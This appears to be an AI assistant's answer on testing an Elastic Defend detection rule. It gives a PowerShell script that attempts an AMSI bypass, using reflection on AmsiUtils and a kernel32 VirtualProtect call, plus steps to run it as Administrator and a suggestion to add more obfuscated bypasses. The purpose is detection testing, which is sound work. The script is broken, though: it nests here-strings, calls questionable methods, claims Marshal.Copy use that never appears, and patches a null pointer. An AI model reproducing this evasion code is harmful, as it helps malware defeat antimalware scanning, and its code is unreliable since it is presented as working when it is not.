To test the "Potential Antimalware Scan Interface (AMSI) Bypass via PowerShell" ElasticDefend rule, the goal is to simulate an AMSI bypass technique that matches the conditions described in the query.

The query looks for specific PowerShell script block text patterns related to AMSI bypass techniques. These can include references to the `System.Management.Automation.AmsiUtils` namespace, known bypass functions like `Invoke-AmsiBypass`, and specific methods like `VirtualProtect` or `SetValue` in obfuscated PowerShell scripts.

To test this rule, you can craft a PowerShell script that uses one of these known AMSI bypass methods. Below is a script that you can use to test the rule.

### PowerShell Script to Test AMSI Bypass Detection

The following script simulates an attempt to bypass AMSI using a commonly known method: invoking `Invoke-AmsiBypass` and using `VirtualProtect` and `Marshal.Copy` to bypass AMSI scanning.

Create a PowerShell script named `amsi_bypass_test.ps1`:

```powershell
# PowerShell script to test AMSI bypass detection
# This script simulates a potential AMSI bypass technique

# Displaying a message
Write-Host "Testing AMSI bypass via PowerShell..."

# Example AMSI bypass using a known function
# This could trigger detection of the 'Invoke-AmsiBypass' string or related patterns
$amsiBypass = @"
function Invoke-AmsiBypass {
    $amsi = [System.Management.Automation.AmsiUtils]::GetAmsiContext()
    $amsi.GetType().GetMethod('Uninitialize').Invoke($amsi, @())
}
Invoke-AmsiBypass
"@

# Execute the AMSI bypass function
Invoke-Expression $amsiBypass

# Another example using VirtualProtect and Marshal.Copy (common bypass technique)
$code = @"
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class AMSI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
}
"@
"@

Add-Type -TypeDefinition $code -Language CSharp

# Using Marshal to copy data and manipulate memory (can be used for AMSI bypass)
$pointer = [System.IntPtr]::Zero
$size = [System.UInt32]::MaxValue
[AMSI]::VirtualProtect($pointer, $size, 0x40, [ref]$null)  # Attempt to alter memory protection

Write-Host "Test complete. Check for alerts in Elastic Defend."
```

### Script Breakdown:

1. **Invoke-AmsiBypass Function**:
   - This part simulates a basic AMSI bypass by utilizing a known technique where `Invoke-AmsiBypass` calls methods from the `System.Management.Automation.AmsiUtils` class to bypass AMSI initialization.

2. **VirtualProtect + Marshal.Copy**:
   - The second part simulates another AMSI bypass method commonly used in malware techniques. It utilizes `VirtualProtect` to manipulate memory protection and bypass AMSI scanning.
   - This technique is commonly used in advanced bypass scenarios where the AMSI scan is altered in memory before running potentially malicious code.

3. **Testing**:
   - The script uses `Invoke-Expression` to run the AMSI bypass code, which will likely trigger the ElasticDefend rule for AMSI bypass detection because it looks for certain keywords (like `Invoke-AmsiBypass`, `VirtualProtect`, `amsi.dll`, etc.).

### Steps to Execute the Script:

1. **Open PowerShell as Administrator**:
   - On your Windows 10 system, open PowerShell with elevated privileges (as Administrator).

2. **Execute the Script**:
   - Save the script as `amsi_bypass_test.ps1`.
   - In the PowerShell window, navigate to the folder where the script is located.
   - Run the script:

   ```powershell
   .\amsi_bypass_test.ps1
   ```

3. **Check Elastic Defend Alerts**:
   - After running the script, check if the "Potential Antimalware Scan Interface Bypass via PowerShell" rule is triggered in your Elastic Security platform.
   - The rule should trigger if the script includes any of the keywords or patterns defined in the query, such as `Invoke-AmsiBypass`, `amsi.dll`, `VirtualProtect`, or related bypass methods.

### Customizing the Script:
- The script can be modified to include more AMSI bypass techniques. For example, adding more obfuscated or advanced bypass methods could help test the detection capabilities further.
- You can adjust the `powershell.file.script_block_text` matching patterns by incorporating additional known AMSI bypass strings.

### Important Notes:
- AMSI bypasses are commonly used by malware to evade detection by security software. This script should only be used in a controlled, testing environment.
- Make sure that your Elastic Defend platform is properly configured to capture `process` events from PowerShell scripts and is monitoring the system for rule matches.

By running this script, you are simulating an AMSI bypass attempt that should trigger the defined ElasticDefend rule, helping you verify that it works as expected. Let me know if you need any further adjustments or help!
